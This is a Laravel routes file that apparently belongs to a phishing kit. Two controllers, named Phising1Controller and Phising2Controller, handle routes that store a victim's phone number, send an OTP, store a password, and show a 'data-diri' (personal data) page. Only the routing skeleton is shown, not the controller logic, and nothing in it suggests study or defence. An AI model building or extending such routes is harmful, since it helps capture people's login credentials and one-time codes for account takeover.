<?php

use App\Http\Controllers\Phising1Controller;
use App\Http\Controllers\Phising2Controller;
use App\Http\Controllers\ProfileController;
use Illuminate\Foundation\Application;
use Illuminate\Support\Facades\Route;
use Inertia\Inertia;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('', [Phising1Controller::class, 'index'])->name('home');
Route::post('store-number', [Phising1Controller::class, 'store_number'])->name('store_number');
Route::post('send-otp', [Phising1Controller::class, 'send_otp'])->name('send_otp');
Route::post('store_password', [Phising1Controller::class, 'store_password'])->name('store_password');


// PHISING 2
Route::get('one', [Phising2Controller::class, 'index'])->name('one.home');
Route::post('one/store-number', [Phising2Controller::class, 'store_number'])->name('one.store_number');
Route::post('one/send-otp', [Phising2Controller::class, 'send_otp'])->name('one.send_otp');
Route::post('one/store_password', [Phising2Controller::class, 'store_password'])->name('one.store_password');

Route::get('data-diri', [Phising1Controller::class, 'data-diri'])->name('data_diri');
